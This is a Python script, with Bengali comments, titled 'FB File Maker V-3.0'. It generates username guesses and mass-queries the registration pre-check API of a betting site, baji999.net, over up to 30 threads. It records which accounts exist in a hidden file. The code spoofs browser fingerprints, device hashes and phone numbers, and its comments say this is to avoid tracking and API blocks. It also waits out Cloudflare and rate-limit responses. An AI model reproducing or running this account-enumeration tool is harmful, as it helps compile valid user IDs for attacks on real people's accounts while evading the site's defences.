import requests
import random
import json
import time
import os
import sys
from concurrent.futures import ThreadPoolExecutor

# ANSI Colors
BOLD, R, G, Y, D, C = '\033[1m', '\033[91m', '\033[92m', '\033[93m', '\033[0m', '\033[96m'

# cxs.py এর মতো গ্লোবাল সেশন (সুপার ফাস্ট স্পিডের জন্য)
session = requests.Session()

def logo():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f'{BOLD}{C}\n       _____ __      ___                \n      / __(_) /__   / _ \\__ ____ _  ___ \n     / _// / / -_) / // / // /  \' \\/ _ \\\n    /_/ /_/_/\\__/ /____/\\_,_/_/_/_/ .__/\n                                 /_/    \n\n      FB File Maker V-3.0 (cxs Engine)\n {D}')

def username_gen(names, start, end):
    usernames = []
    for name in names.split(','):
        for num in range(start, end + 1):
            usernames.append(f'{name.strip().lower()}{num} | {name.strip().capitalize()}')
    return usernames

def checker(uname):
    """cxs.py এর মেথড ব্যবহার করে চেক করা"""
    url = 'https://baji999.net/api/wv/v1/user/registerPreCheck'
    
    # cxs.py এর হুবহু হেডার্স
    headers = {
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        'Content-Type': 'application/json',
        'Accept': 'application/json, text/plain, */*',
        'Referer': 'https://baji999.net/bd/en/register',
        'Origin': 'https://baji999.net',
        'sec-ch-ua-platform': '"Android"'
    }

    # cxs.py এর সেই স্পেশাল ফিঙ্গারপ্রিন্ট পে-লোড
    payload = {
        'languageTypeId': 1,
        'currencyTypeId': 8,
        'userId': uname,
        'phone': '17' + str(random.randint(11111111, 99999999)), # র‍্যান্ডম ফোন যাতে ট্র্যাক না করে
        'registerTypeId': 0,
        'random': str(random.randint(1000, 9999)),
        # নিচের এই ৩টি লাইন এপিআই ব্লক হওয়া আটকাবে
        'fingerprint2': '58df140599f977faf8951888e888e807',
        'browserHash': '3969af0f2862ebb0d85edf6ea8430292',
        'deviceHash': "".join(random.choices("0123456789abcdef", k=32))
    }

    try:
        # requests.Session() ব্যবহার করায় এটি cxs.py এর মতোই ফাস্ট কাজ করবে
        response = session.post(url, headers=headers, json=payload, timeout=8)
        
        if response.status_code == 200:
            data = response.json()
            
            # F0003 = ID Valid (Account Exists)
            if data.get('status') == 'F0003':
                return True
            
            # S0001 = API Limit (Speed Control)
            elif data.get('status') == 'S0001':
                # ব্লক এড়াতে সামান্য বিরতি
                time.sleep(2)
        
        elif response.status_code == 403:
            # ক্লাউডফ্লেয়ার ব্লক করলে ৩ সেকেন্ড ওয়েট
            time.sleep(3)

    except:
        pass
    return False

def check_username(username):
    uname = username.split('|')[0].strip()
    if checker(uname):
        # আউটপুট প্রিন্টিং স্টাইল
        sys.stdout.write(f'\r{G} [VALID] {uname}                               {D}\n')
        with open('.uids.txt', 'a', encoding='utf-8') as f:
            f.write(username + '\n')

def main():
    logo()
    names = input(f'{BOLD}{Y} ENTER NAMES : {D}')
    start = int(input(f'{BOLD}{Y} START : '))
    end = int(input(f'{BOLD}{Y} END : '))
    
    print(f'\n{G} [1] SAFE (10 Threads)')
    print(f'{Y} [2] FAST (20 Threads)')
    print(f'{R} [3] EXTREME (30 Threads - cxs Mode){D}\n')
    
    speed = int(input(f'{C} CHOOSE : {D}'))
    
    # cxs.py এর মতো হাই থ্রেডিং সাপোর্ট
    spd = {1: 10, 2: 20, 3: 30}.get(speed, 10)
    
    usernames = username_gen(names, start, end)
    random.shuffle(usernames)
    
    print(f'\n{BOLD}{G} TARGET : {len(usernames)} | SPEED : {spd}X {D}')
    print(f'{BOLD}{G} ----------------------------------------{D}')
    
    with ThreadPoolExecutor(max_workers=spd) as executor:
        executor.map(check_username, usernames)
        
    if os.path.exists('.uids.txt'):
        total = sum(1 for _ in open('.uids.txt', 'r'))
        print(f'\n{BOLD}{G} ----------------------------------------{D}')
        print(f'{BOLD}{G} DONE! TOTAL VALID IDS: {Y}{total}{D}\n')

if __name__ == '__main__':
    main()

